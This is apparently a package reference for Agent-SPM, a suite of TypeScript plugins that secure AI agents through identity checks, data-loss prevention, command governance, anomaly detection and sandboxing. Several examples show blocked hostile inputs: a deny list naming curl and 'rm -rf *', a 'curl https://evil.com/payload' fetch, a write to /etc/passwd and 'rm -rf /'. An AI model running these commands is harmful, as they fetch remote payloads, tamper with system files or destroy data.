# Package Reference

Comprehensive reference for all Agent-SPM security packages.

---

## Overview

Agent-SPM ships as a monorepo with a core engine and 7 specialized security packages. Each package implements a specific security domain and plugs into the core pipeline.

| Package | npm Scope | Security Domain |
|---------|-----------|-----------------|
| [core](#agent-securitycore) | `@agent-security/core` | Policy engine, plugin pipeline, audit logging |
| [identity](#agent-securityidentity) | `@agent-security/identity` | Agent/tool registration, trust evaluation |
| [egress](#agent-securityegress) | `@agent-security/egress` | Data loss prevention, egress channel control |
| [supply-chain](#agent-securitysupply-chain) | `@agent-security/supply-chain` | MCP scanning, tool provenance, command governance |
| [guardian](#agent-securityguardian) | `@agent-security/guardian` | Anomaly detection, auto-kill, incident response |
| [posture](#agent-securityposture) | `@agent-security/posture` | Inventory, risk scoring, compliance mapping, SIEM |
| [containment](#agent-securitycontainment) | `@agent-security/containment` | Sandbox enforcement, change control |
| [adapters](#agent-securityadapters) | `@agent-security/adapters` | Framework integration (Cursor, Claude Code, LangChain, CrewAI) |

## Dependency Graph

```
@agent-security/adapters ──→ @agent-security/core
@agent-security/identity ──→ @agent-security/core
@agent-security/egress ────→ @agent-security/core
@agent-security/supply-chain → @agent-security/core
@agent-security/guardian ──→ @agent-security/core
@agent-security/posture ───→ @agent-security/core
@agent-security/containment → @agent-security/core
```

All packages depend on `@agent-security/core` for schema types and the `SecurityPlugin` interface. Packages do not depend on each other — they compose at the application level.

---

## @agent-security/core

The policy engine and plugin pipeline. See [architecture](./architecture.md) for the full pipeline design.

**Key exports:**
- `AgentSecurity` — Main platform client
- `SecurityError` — Error thrown when `protect()` blocks execution
- `killSwitch()` — Emergency agent disable plugin
- `rateLimiter()` — Per-agent/per-tool rate limiting plugin
- `sessionContext()` — Cross-call session tracking plugin
- `outputValidator()` — Post-execution output scanning plugin
- `PolicyBundleLoader` — Policy loading and signature verification
- All schema types (see [schemas.md](./schemas.md))

**Pipeline hook:** Orchestrates all phases. See [architecture](./architecture.md#plugin-pipeline).

---

## @agent-security/identity

Agent and tool identity management with trust-based access control.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `AgentRegistry` | Class | Register, lookup, revoke, and query agents |
| `ToolRegistry` | Class | Register, lookup, revoke, and verify tools |
| `TrustEvaluator` | Class | Compute effective trust levels with context |
| `identityEnforcer` | Function | Plugin that enforces identity requirements |

### AgentRegistry

Manages agent identities. Supports registration, lookup, revocation, and queries by type or trust level.

```typescript
import { AgentRegistry } from '@agent-security/identity';

const registry = new AgentRegistry();

registry.register({
  agent_id: 'finance-bot',
  name: 'Finance Bot',
  owner: 'finance-team@acme.com',
  environment: 'prod',
  agent_type: 'workflow_agent',
  trust_level: 'privileged',
  roles: ['finance.reader', 'finance.writer'],
  capabilities: ['tool_call'],
});

const agent = registry.lookup('finance-bot');
const privileged = registry.listByTrustLevel('privileged');

// Revoke a compromised agent
registry.revoke('rogue-bot');
```

**Methods:** `register()`, `lookup()`, `revoke()`, `isRevoked()`, `list()`, `listByType()`, `listByTrustLevel()`, `update()`, `size`, `clear()`

### ToolRegistry

Manages tool identities with SHA-256 manifest verification.

```typescript
import { ToolRegistry } from '@agent-security/identity';

const tools = new ToolRegistry();

tools.register({
  tool_name: 'query_customer_db',
  version: '2.1.0',
  provider: 'built-in',
  verified: true,
  permissions_required: ['db.read'],
});

// Verify tool manifest integrity
const valid = tools.verifyHash('query_customer_db', manifestContent);
```

**Methods:** `register()`, `lookup()`, `revoke()`, `isRevoked()`, `verifyHash()`, `list()`, `listByProvider()`, `listVerified()`, `size`, `clear()`

**Static:** `ToolRegistry.computeHash(manifestContent)` — Compute SHA-256 hash.

### TrustEvaluator

Computes effective trust levels using contextual factors (environment, delegation depth, time of day, consecutive denials).

```typescript
import { TrustEvaluator } from '@agent-security/identity';

const evaluator = new TrustEvaluator();

const result = evaluator.evaluate(agent, {
  environment: 'prod',
  delegation_depth: 2,
  time_of_day: 3,            // 3 AM — suspicious
  consecutive_denials: 5,
});

// result: { effective_trust: 'basic', base_trust: 'privileged', score: 35, adjustments: [...] }
```

**Types:**

```typescript
interface TrustContext {
  environment?: string;
  delegation_depth?: number;
  time_of_day?: number;       // 0-23
  ip_address?: string;
  consecutive_denials?: number;
}

interface TrustResult {
  effective_trust: AgentTrustLevel;
  base_trust: AgentTrustLevel;
  adjustments: Array<{ reason: string; delta: number }>;
  score: number;              // 0-100
}
```

### identityEnforcer

Plugin that enforces agent and tool registration requirements in the `beforeCheck` phase.

```typescript
import { identityEnforcer, AgentRegistry, ToolRegistry, TrustEvaluator } from '@agent-security/identity';

const plugin = identityEnforcer({
  agentRegistry: new AgentRegistry(),
  toolRegistry: new ToolRegistry(),
  trustEvaluator: new TrustEvaluator(),
  requireRegistration: true,        // Deny unregistered agents
  requireToolRegistration: false,   // Don't require tool registration
  minimumTrustLevel: 'basic',       // Minimum trust for any action
  maxDelegationDepth: 3,            // Max delegation chain length
});
```

**Config:** `IdentityEnforcerConfig`

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `agentRegistry` | `AgentRegistry` | *required* | Agent identity store |
| `toolRegistry` | `ToolRegistry` | — | Tool identity store |
| `trustEvaluator` | `TrustEvaluator` | — | Trust computation engine |
| `requireRegistration` | `boolean` | `true` | Deny unregistered agents |
| `requireToolRegistration` | `boolean` | `false` | Deny unregistered tools |
| `minimumTrustLevel` | `AgentTrustLevel` | — | Minimum trust for any action |
| `maxDelegationDepth` | `number` | — | Max delegation chain length |

---

## @agent-security/egress

Data loss prevention and egress channel enforcement. Classifies data in tool arguments and blocks sensitive data from leaving through unauthorized channels.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `egressEnforcer` | Function | Plugin for egress control |
| `DestinationPolicyEngine` | Class | Evaluate egress policies |
| `ComplianceReporter` | Class | Generate DLP compliance reports |
| `DEFAULT_CLASSIFIERS` | Array | All built-in classifiers |
| `createCustomClassifier` | Function | Create custom data classifiers |

### Built-in Classifiers

| Classifier | Classification | Detects |
|------------|---------------|---------|
| `PII_SSN` | PII | Social Security Numbers |
| `PII_EMAIL` | PII | Email addresses |
| `PII_PHONE` | PII | Phone numbers |
| `PCI_CARD_NUMBER` | PCI | Credit card numbers |
| `SECRET_API_KEY` | SECRET | API keys |
| `SECRET_PRIVATE_KEY` | SECRET | Private keys (RSA, etc.) |
| `SECRET_AWS_KEY` | SECRET | AWS access keys |
| `SECRET_GENERIC` | SECRET | Generic secrets (password=, token=) |

### egressEnforcer

Plugin that scans tool arguments for sensitive data and enforces destination policies.

```typescript
import { egressEnforcer, DEFAULT_CLASSIFIERS } from '@agent-security/egress';

const egress = egressEnforcer({
  policy: {
    rules: [
      { id: 'BLOCK_PII_EMAIL', description: 'No PII via email', classifications: ['PII'], channels: ['email'], action: 'block' },
      { id: 'BLOCK_PCI_ALL', description: 'No PCI data anywhere', classifications: ['PCI'], action: 'block' },
      { id: 'BLOCK_SECRETS', description: 'No secrets anywhere', classifications: ['SECRET'], action: 'block' },
    ],
    default_action: 'allow',
  },
  classifiers: DEFAULT_CLASSIFIERS,
  toolChannelMappings: [
    { tool_name: 'send_email', channel: 'email', destination_field: 'to' },
    { tool_name: 'http_request', channel: 'http_request', destination_field: 'url' },
  ],
  onBlocked: (event) => console.log(`DLP blocked: ${event.classifications.map(c => c.classification)}`),
});

// Access egress log
const log = egress.getEgressLog();
```

**Egress channels:** `http_request`, `file_write`, `db_query`, `email`, `clipboard`, `ci_artifact`, `mcp_response`, `terminal_output`

### ComplianceReporter

Generates DLP compliance reports from egress events.

```typescript
import { ComplianceReporter } from '@agent-security/egress';

const reporter = new ComplianceReporter();
const report = reporter.generateReport(egress.getEgressLog());

// report.evidence.no_pii_egress → true/false
// report.summary.blocked_events → count
```

### Custom Classifiers

```typescript
import { createCustomClassifier } from '@agent-security/egress';

const employeeId = createCustomClassifier(
  'employee_id',
  /EMP-\d{6}/g,
  'Employee ID',
  'PII'
);
```

---

## @agent-security/supply-chain

Tool provenance verification, MCP server security scanning, and command governance.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `McpScanner` | Class | Scan MCP server manifests for risks |
| `ToolProvenance` | Class | Register and verify tool manifest hashes |
| `CommandGovernor` | Class | Control shell command execution |
| `supplyChainGuard` | Function | Plugin combining all supply chain checks |

### McpScanner

Analyzes MCP server manifests for security risks. Produces a risk score (0-100) and recommendation.

```typescript
import { McpScanner } from '@agent-security/supply-chain';

const scanner = new McpScanner();
const report = scanner.scan({
  name: 'external-mcp-server',
  permissions: ['network.outbound', 'fs.write'],
  tools: [{ name: 'exec_command', description: 'Execute shell commands' }],
  verified: false,
});

// report.risk_score → 85
// report.recommendation → 'block'
// report.findings → [{ rule: '...', level: 'critical', message: '...' }]
```

**Risk levels:** `critical`, `high`, `medium`, `low`, `info`

**Recommendations:** `block`, `review`, `allow`

### ToolProvenance

SHA-256 manifest verification for tool integrity.

```typescript
import { ToolProvenance } from '@agent-security/supply-chain';

const provenance = new ToolProvenance();

// Register a known-good manifest
provenance.register('query_customer_db', manifestJson, {
  source: 'internal',
  publisher: 'acme-corp',
});

// Verify at runtime
const check = provenance.verify('query_customer_db', currentManifest);
// check.valid → true/false
// check.reason → 'Hash matches' or 'Hash mismatch: expected abc, got def'
```

### CommandGovernor

Pattern-based control for shell command execution. Prevents dangerous commands from being run by agents.

```typescript
import { CommandGovernor } from '@agent-security/supply-chain';

const governor = new CommandGovernor({
  rules: [
    { pattern: 'npm test', action: 'allow', reason: 'Tests are safe' },
    { pattern: 'npm install *', action: 'require_approval', reason: 'Installs need review' },
    { pattern: 'curl', action: 'block', reason: 'External network calls blocked' },
    { pattern: 'rm -rf *', action: 'block', reason: 'Destructive operations blocked' },
  ],
  default_action: 'block',
});

const result = governor.check('curl https://evil.com/payload');
// result.allowed → false
// result.reason → 'External network calls blocked'
```

### supplyChainGuard

Plugin combining provenance verification, command governance, and MCP blocking.

```typescript
import { supplyChainGuard, ToolProvenance, CommandGovernor } from '@agent-security/supply-chain';

const plugin = supplyChainGuard({
  provenance: new ToolProvenance(),
  commandGovernor: new CommandGovernor({ rules: [...], default_action: 'block' }),
  manifestProvider: (toolName) => manifests.get(toolName),
  blockUnverifiedMcp: true,
});
```

**Config:** `SupplyChainGuardConfig`

| Option | Type | Description |
|--------|------|-------------|
| `provenance` | `ToolProvenance` | Tool manifest verification |
| `commandGovernor` | `CommandGovernor` | Shell command control |
| `manifestProvider` | `(toolName) => string \| undefined` | Provides manifests for runtime verification |
| `blockUnverifiedMcp` | `boolean` | Block unverified MCP tools |

---

## @agent-security/guardian

Autonomous anomaly detection and incident response. Monitors audit events for suspicious patterns and can auto-kill rogue agents.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `GuardianAgent` | Class | Anomaly detection engine |
| `BLUEPRINT_ENGINEERING` | Config | Pre-built config for engineering teams |
| `BLUEPRINT_FINANCE` | Config | Pre-built config for finance (stricter thresholds) |
| `BLUEPRINT_SOC` | Config | Pre-built config for SOC monitoring |

### GuardianAgent

Processes audit events and detects anomalies: frequency spikes, volume spikes, suspicious sequences, and off-hours activity.

> **Production recommendation:** Run the Guardian in a separate Node.js process. This ensures the security observer is outside the agent's blast radius — a compromised agent process cannot tamper with Guardian's enforcement or its event log.

```typescript
// agent-process.ts — your agent (existing process)
import { AgentSecurity } from '@agent-security/core';
import * as process from 'process';

const security = new AgentSecurity({
  policyBundle,
  onAuditEvent: (event) => {
    // Stream audit events to guardian process via IPC
    if (process.send) process.send({ type: 'audit_event', event });
  },
});

// guardian-process.ts — run as a SEPARATE Node.js process
import { GuardianAgent, BLUEPRINT_FINANCE } from '@agent-security/guardian';
import * as process from 'process';

const guardian = new GuardianAgent({
  ...BLUEPRINT_FINANCE,
  auto_kill_threshold: 3,
  onAnomaly: (incident) => alertSecurityTeam(incident),
  onKill: (agentId, reason) => {
    console.error(`[GUARDIAN] Terminated agent: ${agentId} — ${reason}`);
);

// Receive audit events from agent process
process.on('message', (msg: any) => {
  if (msg.type === 'audit_event') {
    guardian.processEvent(msg.event);
  }
});
```

**Anomaly types:**

| Type | Description |
|------|-------------|
| `frequency_spike` | Agent exceeding request frequency threshold |
| `volume_spike` | Agent exceeding data volume threshold |
| `suspicious_sequence` | Agent executing a known-bad tool sequence |
| `off_hours` | Agent active outside allowed hours |
| `auto_kill` | Agent terminated after exceeding anomaly threshold |

**Correction modes:**

| Mode | Behavior |
|------|----------|
| `monitor` | Log incidents only |
| `block` | Log and block the triggering request |
| `correct` | Log, block, and auto-kill the agent |

### Blueprints

Pre-configured `GuardianConfig` objects for common use cases:

- **`BLUEPRINT_ENGINEERING`** — Moderate thresholds, monitor mode
- **`BLUEPRINT_FINANCE`** — Strict thresholds, block mode, off-hours detection
- **`BLUEPRINT_SOC`** — Strictest thresholds, correct mode, auto-kill enabled

---

## @agent-security/posture

Fleet-wide security posture management: inventory, risk scoring, regulatory compliance mapping, and SIEM integration.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `PostureInventory` | Class | Asset inventory (agents, tools, plugins, MCP servers) |
| `RiskScorer` | Class | Risk assessment (0-100 scale) |
| `ComplianceMapper` | Class | EU AI Act and UK AI Governance mapping |
| `SocFormatter` | Class | SIEM event formatting (CEF/LEEF/JSON) |
| `AuditExporter` | Class | Export audit logs (JSON/CSV) |

### PostureInventory

Centralized inventory of all security-relevant assets.

```typescript
import { PostureInventory } from '@agent-security/posture';

const inventory = new PostureInventory();

inventory.registerAgent(agentIdentity);
inventory.registerTool(toolIdentity);
inventory.registerPlugin({ name: 'kill-switch', version: '0.1.0' });
inventory.registerMcpServer('external-server', { url: 'https://...' });

inventory.getSummary(); // { agent: 4, tool: 6, plugin: 3, mcp_server: 1 }
```

### RiskScorer

Scores individual assets and entire fleets on a 0-100 risk scale.

```typescript
import { RiskScorer } from '@agent-security/posture';

const scorer = new RiskScorer();
const fleetScore = scorer.scoreFleet(inventory.getAll());

// fleetScore.overall_score → 42
// fleetScore.level → 'medium'
// fleetScore.top_risks → [{ item_id: 'rogue-bot', score: 85, description: '...' }]
```

**Risk levels:** `critical` (75-100), `high` (50-74), `medium` (25-49), `low` (0-24)

### ComplianceMapper

Maps Agent-SPM capabilities to regulatory frameworks. See [docs/compliance.md](./compliance.md) for full control mappings.

```typescript
import { ComplianceMapper } from '@agent-security/posture';

const mapper = new ComplianceMapper();
const report = mapper.generateReport('eu_ai_act', {
  hasInventory: true,
  hasAuditLog: true,
  hasRiskScoring: true,
  hasDlp: true,
  hasHumanOversight: true,
  hasSupplyChainVerification: true,
  hasGuardian: true,
  hasIdentityManagement: true,
});

// report.summary.compliance_score → 95
// report.controls → [{ control_id: 'EU-AI-001', title: '...', status: 'met' }, ...]
```

**Frameworks:** `eu_ai_act`, `uk_ai_governance`

### SocFormatter

Formats audit events for SIEM ingestion.

```typescript
import { SocFormatter } from '@agent-security/posture';

const formatter = new SocFormatter();

const cef = formatter.toCef(auditEvent);   // CEF format (Splunk, QRadar)
const leef = formatter.toLeef(auditEvent); // LEEF format (QRadar)
const json = formatter.toJson(auditEvent); // Structured JSON (Elastic, Sentinel)

// Timeline view
const timeline = formatter.createTimeline(auditEvents);
```

### AuditExporter

Export audit logs for compliance evidence.

```typescript
import { AuditExporter } from '@agent-security/posture';

const exporter = new AuditExporter();
const jsonExport = exporter.exportJson(auditEvents);
const csvExport = exporter.exportCsv(auditEvents);
```

---

## @agent-security/containment

Sandbox enforcement and change control integration.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `SandboxManager` | Class | Tool execution constraints |
| `ChangeControl` | Class | Ticket validation (Jira, Linear, GitHub) |
| `containmentPlugin` | Function | Plugin bridging sandbox + ticket checks |

### SandboxManager

Defines and enforces execution constraints per tool.

```typescript
import { SandboxManager } from '@agent-security/containment';

const sandbox = new SandboxManager();

sandbox.registerSandbox('terminal', {
  type: 'process',
  allowed_paths: ['/tmp', '/home/app'],
  network_enabled: false,
  timeout_ms: 10000,
  memory_limit_mb: 256,
});

// Check constraints before execution
const check = sandbox.checkConstraints('terminal', { command: 'ls /tmp', url: 'https://evil.com' });
// check.allowed → false
// check.violations → ['Network access not allowed for sandbox "terminal"']
```

**Sandbox types:** `process`, `container`, `wasm`, `none`

### ChangeControl

Validates change tickets against external systems.

```typescript
import { ChangeControl } from '@agent-security/containment';

const changeControl = new ChangeControl({
  provider: 'jira',
  ticket_pattern: '^(JIRA|OPS)-\\d+$',
  required_statuses: ['approved', 'in_progress'],
  validateTicket: async (ticketId) => {
    // Call your ticket system API
    return { ticket_id: ticketId, status: 'approved', approved_by: 'lead' };
  },
});

const ticket = await changeControl.validate('OPS-1234');
```

**Ticket providers:** `jira`, `linear`, `github`, `custom`

### containmentPlugin

Plugin that checks sandbox constraints and ticket requirements in the `beforeCheck` phase.

```typescript
import { containmentPlugin, SandboxManager, ChangeControl } from '@agent-security/containment';

const plugin = containmentPlugin({
  sandboxManager: sandbox,
  changeControl: changeControl,
  ticketRequiredTools: ['deploy_service', 'write_db'],
  onBlocked: (toolName, reason) => alertOps(toolName, reason),
});
```

---

## @agent-security/adapters

Framework adapters for integrating Agent-SPM with popular AI agent frameworks.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `createCursorMiddleware` | Function | Cursor IDE MCP middleware |
| `createClaudeCodeWrapper` | Function | Claude Code tool wrapper |
| `wrapLangChainTool` | Function | LangChain tool decorator |
| `createCrewAIGuard` | Function | CrewAI task guard |

### Cursor MCP Middleware

```typescript
import { createCursorMiddleware } from '@agent-security/adapters';

const middleware = createCursorMiddleware(security, {
  agentId: 'cursor-agent',
  environment: 'dev',
});

// In your MCP server handler
const result = await middleware({
  method: 'tools/call',
  params: { name: 'write_file', arguments: { path: '/etc/passwd' } },
});
// result.allowed → false
```

### Claude Code Wrapper

```typescript
import { createClaudeCodeWrapper } from '@agent-security/adapters';

const guard = createClaudeCodeWrapper(security, {
  agentId: 'claude-code',
  environment: 'dev',
});

const result = await guard({
  tool_name: 'bash',
  tool_input: { command: 'rm -rf /' },
});
// result.allowed → false
```

### LangChain Tool Wrapper

```typescript
import { wrapLangChainTool } from '@agent-security/adapters';

const secureTool = wrapLangChainTool(
  security,
  'query_database',
  async (input: { sql: string }) => db.query(input.sql),
  { agentId: 'langchain-agent', environment: 'prod' },
);
```

### CrewAI Guard

```typescript
import { createCrewAIGuard } from '@agent-security/adapters';

const guard = createCrewAIGuard(security, {
  agentId: 'crew-agent',
  environment: 'prod',
});

const result = await guard({
  task_description: 'Analyze customer data',
  agent_role: 'researcher',
  tool_name: 'query_customer_db',
  tool_args: { query: 'SELECT * FROM customers' },
  crew_id: 'analytics-crew',
});
```

---

## Cross-References

- **Schema definitions** — [docs/schemas.md](./schemas.md)
- **Architecture and pipeline** — [docs/architecture.md](./architecture.md)
- **Policy authoring** — [docs/policies.md](./policies.md)
- **Compliance mapping** — [docs/compliance.md](./compliance.md)
- **Security properties** — [SECURITY.md](../SECURITY.md)
